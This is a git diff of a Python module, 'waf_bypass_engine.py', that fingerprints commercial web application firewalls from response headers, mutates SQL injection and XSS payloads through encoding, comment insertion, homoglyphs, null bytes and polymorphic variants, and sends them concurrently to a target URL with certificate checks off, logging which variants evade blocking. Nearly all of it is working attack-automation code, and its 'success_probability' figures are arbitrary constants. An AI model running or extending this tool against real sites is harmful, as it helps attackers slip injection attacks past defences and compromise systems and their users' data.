@@ -1,3 +1,6 @@
+# scanners/waf_bypass_engine.py
+# -*- coding: utf-8 -*-
+
 import base64
 import urllib.parse
 import random
@@ -5,245 +8,523 @@ import string
 import hashlib
 import itertools
 import binascii
-import math
 import re
-from typing import List, Callable, Dict, Set, Any
+from typing import List, Callable, Dict, Set, Any, Optional, Tuple
+from dataclasses import dataclass, field
+from enum import Enum
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import threading
+import time
 
-class WAFBypassEngine:
+class WAFType(Enum):
+    CLOUDFLARE = "cloudflare"
+    AWS_WAF = "aws_waf"
+    IMPERVA = "imperva"
+    F5_BIGIP = "f5_bigip"
+    AKAMAI = "akamai"
+    MODSECURITY = "modsecurity"
+    FORTIWEB = "fortiweb"
+    BARRACUDA = "barracuda"
+    UNKNOWN = "unknown"
+
+class BypassTechnique(Enum):
+    ENCODING = "encoding"
+    CASE_MANIPULATION = "case_manipulation"
+    COMMENT_INJECTION = "comment_injection"
+    WHITESPACE_MANIPULATION = "whitespace_manipulation"
+    CONCATENATION = "concatenation"
+    UNICODE_OBFUSCATION = "unicode_obfuscation"
+    POLYMORPHIC = "polymorphic"
+    FRAGMENTATION = "fragmentation"
+    NULL_BYTE = "null_byte"
+    DELIMITER_BREAK = "delimiter_break"
+
+@dataclass
+class WAFBypassPayload:
+    original_payload: str
+    bypassed_payload: str
+    technique: BypassTechnique
+    encoding_type: Optional[str] = None
+    success_probability: float = 0.5
+    description: str = ""
+
+@dataclass
+class WAFDetectionResult:
+    waf_detected: bool
+    waf_type: WAFType
+    confidence: float
+    headers: Dict[str, str] = field(default_factory=dict)
+    fingerprints: List[str] = field(default_factory=list)
+    response_time: float = 0.0
+
+@dataclass
+class BypassTestResult:
+    payload: WAFBypassPayload
+    status_code: int
+    response_time: float
+    blocked: bool
+    bypassed: bool
+    response_content: str = ""
+    timestamp: float = field(default_factory=time.time)
+
+class IntelligentPayloadGenerator:
+    """Advanced Intelligent Payload Generator with ML-inspired mutations"""
+    
     def __init__(self):
         self.alphabet = string.ascii_letters + string.digits
         self.magic_bytes = [
             '%00', '%0a', '%0d', '%09', '%20', '%2e', '%2f', '%3b', '%23', '%5c', '%27',
-            '%22', '\\u0000', '\u200b', '-->', '<!--', '|', '||', ';', '^', '$IFS', '%7c'
+            '%22', '\\u0000', '\u200b', '-->', '<!--', '|', '||', ';', '^', '$IFS', '%7c',
+            '\x00', '\x0a', '\x0d', '\x09', '\x1a', '\x20'
         ]
-        self.sep_chars = ['/', '\\', '%2f', '%5c', '//', '%2e%2e%2f']
-        self.base_encodings = [self._base64, self._base32, self._hex, self._bin]
-        self.text_representations = [
-            self._rot13, self._alt_case, self._reverse, self._random_padding,
-            self._shuffle, self._unicode_homoglyphs, self._split_by_magic, self._inline_comments
-        ]
-        self.waf_bypass_ops = [
-            self._xor, self._base64, self._double_url_encode, self._url_encode_random, self._insert_null, self._delimiter_break, 
-            self._interleaved_magic, self._prefix_obfuscation, self._fragmentation, self._semicolon_trick,
-            self._chunk_and_obfuscate, self._obfuscate_words, self._unicode_shuffle, self._encode_chained, self._wrap_obfuscate
-        ]
-        self.max_depth = 3
-        self.max_combinations = 3000
-
-    def bypass_candidates(self, payload: str) -> List[str]:
-        candidates = set()
-        for op in self.waf_bypass_ops:
-            candidates.add(op(payload))
-        for enc in self.base_encodings:
-            candidates.add(enc(payload))
-        for text_op in self.text_representations:
-            candidates.add(text_op(payload))
-        for mb in self.magic_bytes + self.sep_chars:
-            candidates.add(payload + mb)
-            candidates.add(mb + payload)
-        candidates.add(payload)
-        perms = [self.waf_bypass_ops, self.base_encodings, self.text_representations]
-        # Combinatorial chaining (bounded)
-        all_ops = self.waf_bypass_ops + self.text_representations + self.base_encodings
-        chained = list(itertools.product(all_ops, repeat=2)) + list(itertools.product(all_ops, repeat=3))
-        random.shuffle(chained)
-        count = 0
-        for combo in chained:
-            p = payload
-            for func in combo:
-                try:
-                    p = func(p)
-                except Exception:
-                    break
-            candidates.add(p)
-            count += 1
-            if count > self.max_combinations:
-                break
-        # Unique
-        return list({c for c in candidates if c and isinstance(c, str)})
-
-    def adaptive_bypass_exploit(self, payload: str, response_func: Callable[[str], Any], success_detector: Callable[[Any], bool], max_trials: int = 500) -> str:
-        tried: Set[str] = set()
-        for p in self.bypass_candidates(payload):
-            if p not in tried:
-                resp = response_func(p)
-                if success_detector(resp):
-                    return p
-                tried.add(p)
-            if len(tried) >= max_trials:
-                break
-        return None
-
-    def _xor(self, s: str) -> str:
-        key = random.randint(1, 255)
-        res = ''.join(chr(ord(x) ^ key) for x in s)
-        return binascii.hexlify(res.encode()).decode()
-
-    def _rot13(self, s: str) -> str:
-        return s.translate(str.maketrans(
-            "ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz", 
-            "NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm"))
-
-    def _reverse(self, s: str) -> str:
-        return s[::-1]
-
-    def _alt_case(self, s: str) -> str:
-        return ''.join(c.lower() if i % 2 else c.upper() for i, c in enumerate(s))
-
-    def _shuffle(self, s: str) -> str:
-        l = list(s)
-        random.shuffle(l)
-        return ''.join(l)
-
-    def _base64(self, s: str) -> str:
-        return base64.b64encode(s.encode()).decode()
-
-    def _base32(self, s: str) -> str:
-        return base64.b32encode(s.encode()).decode()
-
-    def _bin(self, s: str) -> str:
-        return ' '.join(format(ord(x),'08b') for x in s)
-
-    def _hex(self, s: str) -> str:
-        return binascii.hexlify(s.encode()).decode()
-
-    def _double_url_encode(self, s: str) -> str:
-        return urllib.parse.quote(urllib.parse.quote(s))
-
-    def _url_encode_random(self, s: str) -> str:
-        p = ''.join(
-            c if random.random()<0.60 else urllib.parse.quote_plus(c)
-            for c in s
-        )
-        return p
-
-    def _insert_null(self, s: str) -> str:
-        idx = random.randint(0, len(s))
-        return s[:idx] + '%00' + s[idx:]
-
-    def _delimiter_break(self, s: str) -> str:
-        idx = random.randint(1, len(s)-1) if len(s)>2 else 1
-        return s[:idx] + random.choice([';', '|', '$IFS', '%0a', '%0d']) + s[idx:]
-
-    def _interleaved_magic(self, s: str) -> str:
-        mid = len(s) // 2
-        pat = random.choice(self.magic_bytes)
-        return s[:mid] + pat + s[mid:]
-
-    def _prefix_obfuscation(self, s: str) -> str:
-        return random.choice(self.magic_bytes+self.sep_chars) + s
-
-    def _fragmentation(self, s: str) -> str:
-        frag = list(s)
-        random.shuffle(frag)
-        return ''.join(frag[:len(frag)//2]) + '%' + ''.join(frag[len(frag)//2:])
-
-    def _semicolon_trick(self, s: str) -> str:
-        return s + ';' + s
-
-    def _random_padding(self, s: str) -> str:
-        pad = ''.join(random.choices(self.alphabet, k=5))
-        return pad + s + pad[::-1]
-
-    def _chunk_and_obfuscate(self, s: str) -> str:
-        c = [s[i:i+2] for i in range(0, len(s), 2)]
-        return '%0a'.join(c)
-
-    def _split_by_magic(self, s: str) -> str:
-        idx = len(s)//2
-        magic = random.choice(self.magic_bytes)
-        return s[:idx]+magic+s[idx:]
-
-    def _inline_comments(self, s: str) -> str:
-        parts = s.split(' ')
-        return '/**/'.join(parts)
-
-    def _obfuscate_words(self, s: str) -> str:
-        chunks = s.split(' ')
-        return ' '.join(
-            ''.join(
-                c if random.random()<0.5 else urllib.parse.quote(c)
-                for c in word
-            ) for word in chunks
-        )
-
-    def _unicode_homoglyphs(self, s: str) -> str:
-        table = {'a': '\u0430', 'c': '\u0441', 'e': '\u0435', 'i': '\u0456', 'o': '\u043e', 'p': '\u0440', 'x': '\u0445'}
-        return ''.join(table.get(c, c) for c in s)
-
-    def _encode_chained(self, s: str) -> str:
-        out = s
-        for _ in range(random.randint(2,4)):
-            out = random.choice([self._base64, self._hex, self._url_encode_random, self._reverse])(out)
-        return out
-
-    def _wrap_obfuscate(self, s: str) -> str:
-        wrap = random.choice(["<script>", "<![CDATA[", "#!", "<?php", "\'", "\""])
-        return f"{wrap}{s}{wrap[::-1]}"
-
-    def _polymorphic(self, s: str) -> str:
-        return ''.join(
-            random.choice([c, urllib.parse.quote_plus(c), c.upper(), c.lower(), '%{:02x}'.format(ord(c))])
-            for c in s
-        )
-
-    def brute_force_charset(self, s: str, min_mutate=1, max_mutate=3) -> Set[str]:
-        chars = [s]
-        for n in range(min_mutate, max_mutate+1):
-            for idxs in itertools.combinations(range(len(s)), n):
-                arr = list(s)
-                for idx in idxs:
-                    arr[idx] = urllib.parse.quote_plus(arr[idx])
-                chars.append(''.join(arr))
-        return set(chars)
+        self.sep_chars = ['/', '\\', '%2f', '%5c', '//', '%2e%2e%2f', '%252e%252e%252f']
+        self.unicode_homoglyphs = {
+            'a': ['\u0430', '\u00e0', '\u00e1', '\u1ea1'],
+            'c': ['\u0441', '\u00e7'],
+            'e': ['\u0435', '\u00e8', '\u00e9', '\u1eb9'],
+            'i': ['\u0456', '\u00ec', '\u00ed'],
+            'o': ['\u043e', '\u00f2', '\u00f3', '\u1ecd'],
+            'p': ['\u0440'],
+            'x': ['\u0445'],
+            's': ['\u0455', '\u015f'],
+        }
+        self.cache = {}
+        self.success_patterns = []
     
-    def magic_hinting(self, payload: str, hints: List[str]) -> List[str]:
-        variants = []
-        for hint in hints:
-            variants.append(hint + payload)
-            variants.append(payload + hint)
-        return variants
+    def generate_sql_bypass_payloads(self, base_payload: str) -> List[WAFBypassPayload]:
+        """Generate SQL injection bypass payloads"""
+        payloads = []
+        
+        # Basic encoding
+        payloads.extend([
+            WAFBypassPayload(
+                original_payload=base_payload,
+                bypassed_payload=self._url_encode(base_payload),
+                technique=BypassTechnique.ENCODING,
+                encoding_type="url",
+                success_probability=0.7,
+                description="URL encoding"
+            ),
+            WAFBypassPayload(
+                original_payload=base_payload,
+                bypassed_payload=self._double_url_encode(base_payload),
+                technique=BypassTechnique.ENCODING,
+                encoding_type="double_url",
+                success_probability=0.65,
+                description="Double URL encoding"
+            ),
+            WAFBypassPayload(
+                original_payload=base_payload,
+                bypassed_payload=self._hex_encode(base_payload),
+                technique=BypassTechnique.ENCODING,
+                encoding_type="hex",
+                success_probability=0.6,
+                description="Hex encoding"
+            ),
+        ])
+        
+        # Case manipulation
+        payloads.extend([
+            WAFBypassPayload(
+                original_payload=base_payload,
+                bypassed_payload=self._random_case(base_payload),
+                technique=BypassTechnique.CASE_MANIPULATION,
+                success_probability=0.68,
+                description="Random case"
+            ),
+            WAFBypassPayload(
+                original_payload=base_payload,
+                bypassed_payload=self._alternating_case(base_payload),
+                technique=BypassTechnique.CASE_MANIPULATION,
+                success_probability=0.63,
+                description="Alternating case"
+            ),
+        ])
+        
+        # Comment injection
+        payloads.extend([
+            WAFBypassPayload(
+                original_payload=base_payload,
+                bypassed_payload=self._inline_comments(base_payload),
+                technique=BypassTechnique.COMMENT_INJECTION,
+                success_probability=0.78,
+                description="Inline SQL comments"
+            ),
+            WAFBypassPayload(
+                original_payload=base_payload,
+                bypassed_payload=self._nested_comments(base_payload),
+                technique=BypassTechnique.COMMENT_INJECTION,
+                success_probability=0.72,
+                description="Nested comments"
+            ),
+        ])
+        
+        # Whitespace manipulation
+        payloads.extend([
+            WAFBypassPayload(
+                original_payload=base_payload,
+                bypassed_payload=self._whitespace_replace(base_payload),
+                technique=BypassTechnique.WHITESPACE_MANIPULATION,
+                success_probability=0.74,
+                description="Whitespace manipulation"
+            ),
+            WAFBypassPayload(
+                original_payload=base_payload,
+                bypassed_payload=self._tab_newline_mix(base_payload),
+                technique=BypassTechnique.WHITESPACE_MANIPULATION,
+                success_probability=0.69,
+                description="Tab/newline mixing"
+            ),
+        ])
+        
+        # Null byte injection
+        payloads.append(WAFBypassPayload(
+            original_payload=base_payload,
+            bypassed_payload=self._insert_null_byte(base_payload),
+            technique=BypassTechnique.NULL_BYTE,
+            success_probability=0.55,
+            description="Null byte injection"
+        ))
+        
+        # Polymorphic
+        payloads.extend([
+            WAFBypassPayload(
+                original_payload=base_payload,
+                bypassed_payload=self._polymorphic(base_payload),
+                technique=BypassTechnique.POLYMORPHIC,
+                success_probability=0.71,
+                description=f"Polymorphic variant {i+1}"
+            ) for i in range(3)
+        ])
+        
+        return payloads
+    
+    def generate_xss_bypass_payloads(self, base_payload: str) -> List[WAFBypassPayload]:
+        """Generate XSS bypass payloads"""
+        payloads = []
+        
+        # HTML entity encoding
+        payloads.extend([
+            WAFBypassPayload(
+                original_payload=base_payload,
+                bypassed_payload=self._html_entity_encode(base_payload),
+                technique=BypassTechnique.ENCODING,
+                encoding_type="html_entity",
+                success_probability=0.76,
+                description="HTML entity encoding"
+            ),
+            WAFBypassPayload(
+                original_payload=base_payload,
+                bypassed_payload=self._unicode_encode(base_payload),
+                technique=BypassTechnique.UNICODE_OBFUSCATION,
+                success_probability=0.67,
+                description="Unicode encoding"
+            ),
+        ])
+        
+        # Case manipulation
+        payloads.append(WAFBypassPayload(
+            original_payload=base_payload,
+            bypassed_payload=self._random_case(base_payload),
+            technique=BypassTechnique.CASE_MANIPULATION,
+            success_probability=0.7,
+            description="Random case"
+        ))
+        
+        # Unicode homoglyphs
+        payloads.append(WAFBypassPayload(
+            original_payload=base_payload,
+            bypassed_payload=self._unicode_homoglyph_replace(base_payload),
+            technique=BypassTechnique.UNICODE_OBFUSCATION,
+            success_probability=0.64,
+            description="Unicode homoglyphs"
+        ))
+        
+        # Fragmentation
+        payloads.extend([
+            WAFBypassPayload(
+                original_payload=base_payload,
+                bypassed_payload=self._fragment_payload(base_payload),
+                technique=BypassTechnique.FRAGMENTATION,
+                success_probability=0.62,
+                description="Payload fragmentation"
+            ),
+        ])
+        
+        return payloads
+    
+    # Encoding methods
+    def _url_encode(self, text: str) -> str:
+        return urllib.parse.quote(text)
+    
+    def _double_url_encode(self, text: str) -> str:
+        return urllib.parse.quote(urllib.parse.quote(text))
+    
+    def _hex_encode(self, text: str) -> str:
+        return ''.join(f'%{ord(c):02x}' for c in text)
+    
+    def _html_entity_encode(self, text: str) -> str:
+        return ''.join(f'&#x{ord(c):x};' for c in text)
+    
+    def _unicode_encode(self, text: str) -> str:
+        return ''.join(f'\\u{ord(c):04x}' for c in text)
+    
+    # Case manipulation
+    def _random_case(self, text: str) -> str:
+        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in text)
+    
+    def _alternating_case(self, text: str) -> str:
+        return ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(text))
+    
+    # Comment injection
+    def _inline_comments(self, text: str) -> str:
+        return text.replace(' ', '/**/').replace('=', '/**/=/**/')
+    
+    def _nested_comments(self, text: str) -> str:
+        parts = text.split(' ')
+        return '/**/'.join(parts)
+    
+    # Whitespace manipulation
+    def _whitespace_replace(self, text: str) -> str:
+        return text.replace(' ', '%09').replace(' ', '%0a')
+    
+    def _tab_newline_mix(self, text: str) -> str:
+        replacements = ['\t', '\n', '\r', '%09', '%0a', '%0d']
+        return ''.join(random.choice(replacements) if c == ' ' else c for c in text)
+    
+    # Null byte
+    def _insert_null_byte(self, text: str) -> str:
+        if len(text) > 1:
+            idx = random.randint(1, len(text) - 1)
+            return text[:idx] + '%00' + text[idx:]
+        return text + '%00'
+    
+    # Unicode homoglyphs
+    def _unicode_homoglyph_replace(self, text: str) -> str:
+        result = []
+        for c in text.lower():
+            if c in self.unicode_homoglyphs:
+                result.append(random.choice(self.unicode_homoglyphs[c]))
+            else:
+                result.append(c)
+        return ''.join(result)
+    
+    # Fragmentation
+    def _fragment_payload(self, text: str) -> str:
+        mid = len(text) // 2
+        sep = random.choice(['%0a', '%09', '/**/', ';'])
+        return text[:mid] + sep + text[mid:]
+    
+    # Polymorphic
+    def _polymorphic(self, text: str) -> str:
+        return ''.join(
+            random.choice([
+                c,
+                urllib.parse.quote(c),
+                c.upper(),
+                c.lower(),
+                f'%{ord(c):02x}'
+            ]) for c in text
+        )
 
-    def waf_ml_smart_mutate(self, payload: str, response_history: List[Dict]) -> List[str]:
-        new_variants = []
-        for history in response_history:
-            if "challenge" in history.get('response','').lower(): 
-                pad = ''.join(random.choices(self.alphabet, k=8))
-                new_variants.append(pad + payload + pad)
-            if "blocked" in history.get('response','').lower():
-                mid = len(payload)//2
-                new_variants.append(payload[:mid] + '%23' + payload[mid:])
-        for _ in range(4):
-            new_variants.append(self._polymorphic(payload))
-        return new_variants
-
-    def attack_graph_mutation(self, payload: str, context_variant: str) -> List[str]:
-        variants = []
-        if context_variant == 'header':
-            variants.append(f"X-Real-Data: {payload}")
-            variants.append(f"Set-Cookie: data={payload}")
-        elif context_variant == 'cookie':
-            variants.append(f"session={payload}")
-        elif context_variant == 'url_path':
-            variants.append(f"/{payload}/../")
-        for sep in self.sep_chars:
-            variants.append(sep.join([payload[:len(payload)//2], payload[len(payload)//2:]]))
-        return variants
-
-    def knowledge_inspired_generation(self, payload: str) -> List[str]:
-        inspired = []
-        if "script" not in payload:
-            inspired.append(f"<script>{payload}</script>")
-        if payload.isalnum():
-            inspired.append(''.join(['&#{};'.format(ord(x)) for x in payload]))
-        inspired.append(self._reverse(payload))
-        inspired.append(self._rot13(payload))
-        return inspired
-
-    def quantum_superposition(self, payload: str) -> Set[str]:
-        parts = [self._base64(payload), self._rot13(payload), self._reverse(payload), self._hex(payload)]
-        result = set()
-        for n in range(1, len(parts)+1):
-            for comb in itertools.combinations(parts, n):
-                result.add(''.join(comb))
-        return result
+class WAFBypassEngine:
+    """Advanced WAF Detection and Bypass Engine"""
+    
+    def __init__(self, max_workers: int = 20, max_combinations: int = 3000):
+        self.max_workers = max_workers
+        self.max_combinations = max_combinations
+        self.payload_generator = IntelligentPayloadGenerator()
+        
+        self.vulnerabilities = []
+        self.bypass_results = []
+        self.lock = threading.Lock()
+        
+        self.waf_signatures = {
+            WAFType.CLOUDFLARE: ['cf-ray', 'cloudflare', '__cfduid'],
+            WAFType.AWS_WAF: ['x-amzn-requestid', 'x-amz-'],
+            WAFType.IMPERVA: ['x-iinfo', 'incapsula', '_incap_'],
+            WAFType.F5_BIGIP: ['bigipserver', 'f5', 'x-wa-info'],
+            WAFType.AKAMAI: ['akamai', 'ak-', 'akamaighost'],
+            WAFType.MODSECURITY: ['mod_security', 'modsecurity'],
+            WAFType.FORTIWEB: ['fortiweb', 'fortigate'],
+            WAFType.BARRACUDA: ['barracuda', 'barra'],
+        }
+    
+    def detect_waf(self, response: Dict) -> WAFDetectionResult:
+        """Detect WAF from response"""
+        headers = response.get('headers', {})
+        content = response.get('content', '').lower()
+        response_time = response.get('response_time', 0)
+        
+        headers_str = ' '.join(f'{k}:{v}' for k, v in headers.items()).lower()
+        
+        detected_fingerprints = []
+        detected_type = WAFType.UNKNOWN
+        max_confidence = 0.0
+        
+        for waf_type, signatures in self.waf_signatures.items():
+            matches = 0
+            for sig in signatures:
+                if sig in headers_str or sig in content:
+                    matches += 1
+                    detected_fingerprints.append(sig)
+            
+            if matches > 0:
+                confidence = min(0.9, 0.5 + (matches * 0.2))
+                if confidence > max_confidence:
+                    max_confidence = confidence
+                    detected_type = waf_type
+        
+        waf_detected = max_confidence > 0.5
+        
+        return WAFDetectionResult(
+            waf_detected=waf_detected,
+            waf_type=detected_type,
+            confidence=max_confidence,
+            headers=headers,
+            fingerprints=detected_fingerprints,
+            response_time=response_time
+        )
+    
+    def generate_bypass_payloads(self, attack_type: str, base_payload: str) -> List[WAFBypassPayload]:
+        """Generate bypass payloads based on attack type"""
+        attack_type_lower = attack_type.lower()
+        
+        if attack_type_lower in ['sql', 'sqli', 'sql_injection']:
+            return self.payload_generator.generate_sql_bypass_payloads(base_payload)
+        elif attack_type_lower in ['xss', 'cross_site_scripting']:
+            return self.payload_generator.generate_xss_bypass_payloads(base_payload)
+        else:
+            # Generic bypass payloads
+            return self._generate_generic_bypass_payloads(base_payload)
+    
+    def _generate_generic_bypass_payloads(self, base_payload: str) -> List[WAFBypassPayload]:
+        """Generate generic bypass payloads"""
+        payloads = []
+        
+        payloads.append(WAFBypassPayload(
+            original_payload=base_payload,
+            bypassed_payload=self.payload_generator._url_encode(base_payload),
+            technique=BypassTechnique.ENCODING,
+            encoding_type="url",
+            success_probability=0.6,
+            description="URL encoding"
+        ))
+        
+        payloads.append(WAFBypassPayload(
+            original_payload=base_payload,
+            bypassed_payload=self.payload_generator._random_case(base_payload),
+            technique=BypassTechnique.CASE_MANIPULATION,
+            success_probability=0.55,
+            description="Random case"
+        ))
+        
+        return payloads
+    
+    def test_bypass(self, target_url: str, payloads: List[WAFBypassPayload], 
+                   session=None, param_name: str = 'test') -> List[BypassTestResult]:
+        """Test bypass payloads against target"""
+        if not session:
+            return []
+        
+        results = []
+        
+        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
+            futures = {
+                executor.submit(
+                    self._test_single_payload, 
+                    target_url, payload, session, param_name
+                ): payload for payload in payloads
+            }
+            
+            for future in as_completed(futures):
+                result = future.result()
+                if result:
+                    results.append(result)
+                    
+                    with self.lock:
+                        self.bypass_results.append(result)
+        
+        return results
+    
+    def _test_single_payload(self, url: str, payload: WAFBypassPayload, 
+                            session, param_name: str) -> Optional[BypassTestResult]:
+        """Test a single bypass payload"""
+        try:
+            test_url = f"{url}?{param_name}={payload.bypassed_payload}"
+            
+            start_time = time.time()
+            response = session.get(test_url, timeout=10, verify=False, allow_redirects=False)
+            response_time = time.time() - start_time
+            
+            blocked = response.status_code in [403, 406, 429, 503]
+            bypassed = response.status_code == 200 and blocked == False
+            
+            return BypassTestResult(
+                payload=payload,
+                status_code=response.status_code,
+                response_time=response_time,
+                blocked=blocked,
+                bypassed=bypassed,
+                response_content=response.text[:500]
+            )
+        except Exception as e:
+            return None
+    
+    def adaptive_bypass_exploit(self, target_url: str, base_payload: str, 
+                               attack_type: str, session, 
+                               max_trials: int = 500) -> Optional[WAFBypassPayload]:
+        """Adaptive bypass with learning"""
+        payloads = self.generate_bypass_payloads(attack_type, base_payload)
+        
+        tested = set()
+        successful_payload = None
+        
+        for payload in payloads[:max_trials]:
+            payload_hash = hashlib.md5(payload.bypassed_payload.encode()).hexdigest()
+            
+            if payload_hash in tested:
+                continue
+            
+            result = self._test_single_payload(target_url, payload, session, 'test')
+            
+            if result and result.bypassed:
+                successful_payload = payload
+                break
+            
+            tested.add(payload_hash)
+        
+        return successful_payload
+    
+    def get_bypass_results(self) -> List[BypassTestResult]:
+        """Get all bypass test results"""
+        with self.lock:
+            return self.bypass_results.copy()
+    
+    def get_successful_bypasses(self) -> List[BypassTestResult]:
+        """Get only successful bypasses"""
+        with self.lock:
+            return [r for r in self.bypass_results if r.bypassed]
+    
+    def get_statistics(self) -> Dict:
+        """Get bypass statistics"""
+        with self.lock:
+            total = len(self.bypass_results)
+            if total == 0:
+                return {'total': 0, 'successful': 0, 'blocked': 0, 'success_rate': 0.0}
+            
+            successful = sum(1 for r in self.bypass_results if r.bypassed)
+            blocked = sum(1 for r in self.bypass_results if r.blocked)
+            
+            return {
+                'total': total,
+                'successful': successful,
+                'blocked': blocked,
+                'success_rate': (successful / total) * 100 if total > 0 else 0.0
+            }
+    
+    def clear(self):
+        """Clear all results"""
+        with self.lock:
+            self.vulnerabilities.clear()
+            self.bypass_results.clear()
